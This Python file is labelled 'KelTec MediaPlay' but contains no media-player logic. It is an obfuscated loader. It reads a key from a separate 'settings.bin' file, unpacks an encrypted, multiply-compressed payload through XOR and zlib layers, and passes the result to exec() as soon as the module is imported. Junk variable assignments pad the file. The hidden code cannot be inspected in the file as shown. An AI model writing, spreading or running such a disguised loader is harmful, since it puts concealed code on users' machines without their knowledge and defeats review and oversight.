# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 151313 ^ 145182
_lx1_1 = len("78ba97")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-867536)
_lx3_3 = 133386 * 0
_lx4_4 = 929370 ^ 708496
# _K carregada de arquivo externo
_M = 'ABcvDzoIzzADf9BhYbRSVSzzuWWVNOphRyiHPz+eFL5WEiIdOlTOIgp622E3tFFQKPe8YJZjvzZBeNBpZskUugYTJEpmXcZ1CnLa'
_D = '=ApxedRd6MB3il0uv6rQSMl9W4Ra9KxMGZN3yieK956Zu7ewWcgMA8OVID36ctIaQkUW0D5wkaAWRbeIYkAiu2HpmZIijwXe/wRwGWs0tfYRRhSW9vnyTnC3zCsDzXsYBRRlUEmosGNgLaYG3WJ1iExhC6vF6C13nwKVDUBVsoTkxDrKGl/pTSpS24lstKzRFdxv29wSV5/Kq0lGapNoorzc81DfzJxLe55JkXdNnLXT8iMB4W6ADOHsGpmnmmCYs9b35a+pSorvUbcWL9wvUjT+bWxXhn+x8eBzdD2SxBYaxZQtsXQtwwit0MVt0CipLYr+mNJoJ9EcgbPtWAQ6pteAcvH3ItOAaT8gjE+k42EvZYvQU7oqjmmgZJURBLYQwcTESNM7sqIXkvS0IgvNB7ifymd/hDI1hVcTiwFawAraD/we3J47sJST31tt0+5sH78RwAi/NS43exFvvHiTWpOagA6j6p7ln0cHlYySP69MpgM6O/WXX4hEbvB/L8Ga52RFwIYIo5+srILsN5vWkdQO0Xk+otjqaGmdRqA0QgmntKxeCnLorzBPEoKF733en+cvnYBh2+PdFQX+mWVLVhAEs0R7SWkjAy38nlD9XoC5En9Iv6CsN60kUeWzQnt+QWVwhuaLOwpwZ2Y6/RfC8i/GYNnmftAnINp3x4YpTANui7qJfleGKYNOxupWMyLdf+T8rdCk7Dcw++H538rheuIBlLzxApx9bjfxQGQuzUMw4vaZ6REyq8C8fOxnpLhAkmnzMSmqTi9wXStez/PJS1yZ9D6/MAzO2lRWCPGPjQVb5PQGpEaDUYN4HHx15EfwlYQcaTSIBpL5T/ux8xSpM7XkSszsH2ALc+Q1oIE5NCX5me43ZrkTHBDFvyTxXyYSYyYQmA44Z5wfqYlDgdbkt/d+E4i/adav+JCXJedcKa3zvZ4cQb9YkHwzC7DWPDTD5X3hUROFmJ2kUqnqmkKkvXi+Q6ISEAsrlYyqlxznadogb+hdM8ZYXYcTaKZYN/w2yUPTReN37VzljaJJVss6vHEkOtn1MUFhJs+2UdPMeVH/qMDR0aakYb3DhGmyK4+QENGRxoybBBpJlV48taECyXX5uZGmcSLxcxd4jA8rgvarMmAdUAUjH90IBlsiVadp7vTZ/xGEcNzPLmh3fPDbBCiEcnll2kP1sqS9LZgeqLI3kg23auszabHco0IZkPkXk9DHuJYTU1rtAOExjPGLFw+rCihSsrV6WY271mku3bGeNPwxoR4BSyChOghbSc+2AZS1qO0u6NHHlJlVV2VkYux/Ra5OqaVZF5fC6i8ryJlVGLt9eKjcy+MsG3wg9fhbV7p5BXAv9Ume1E6J+f617+vyX9Lrt4Ry51BURzxqjqpZM9UeVGw8jij12y+AqLhCaweDXADN98Sb+xViRg75/o6zls52kMfrMTTu3ebJ5XDbz/85dLmd+W0Ynmsjr9wvBTeBK0Us1e/+bYOh5OwirGVxDsMppKfx8VI04yOiAL/+UvNJwtLRLD6m7dfh3yzHsuvphduM'

_kf=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),'resources/data','settings.bin')
with open(_kf,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()